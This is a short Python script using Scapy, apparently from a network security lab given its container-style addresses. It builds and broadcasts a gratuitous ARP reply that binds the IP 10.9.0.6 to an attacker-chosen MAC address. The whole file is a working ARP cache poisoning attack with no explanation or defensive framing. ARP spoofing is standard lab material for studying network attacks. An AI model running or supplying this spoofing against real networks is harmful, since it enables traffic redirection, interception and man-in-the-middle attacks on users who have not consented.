from scapy.all import *
E = Ether()
E.dst = 'ff:ff:ff:ff:ff:ff'
E.src = '02:42:0a:09:00:69'
A = ARP()
A.hwsrc = '02:42:0a:09:00:69'
A.psrc = '10.9.0.6'
A.pdst = '10.9.0.6'
A.hwdst = 'ff:ff:ff:ff:ff:ff'
A.op = 2
pkt = E/A
sendp(pkt)